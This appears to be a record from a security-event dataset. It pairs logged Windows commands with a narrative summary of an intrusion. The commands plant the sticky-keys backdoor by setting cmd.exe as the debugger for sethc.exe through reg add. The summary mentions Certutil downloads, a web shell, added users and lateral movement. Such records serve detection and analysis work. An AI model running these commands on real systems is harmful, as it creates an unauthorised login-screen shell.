malicious_events.command: reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d \"C:\windows\system32\sethc.exe\"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"

output.narrative: The attackers started by downloading an executable using Certutil on port 8079, likely making use of a web shell. This was followed up with other scripts downloaded via HTTP requests across multiple ports. The attacker also dropped multiple executables in various locations such as C:\Users\Public and modified registry keys. They used Reg.exe to modify image execution options for sethc.exe and added new users using Net.exe. Other activities included creating a backdoor via the command line. In total, there were multiple instances where they made lateral movement by moving laterally within the network using scripts.
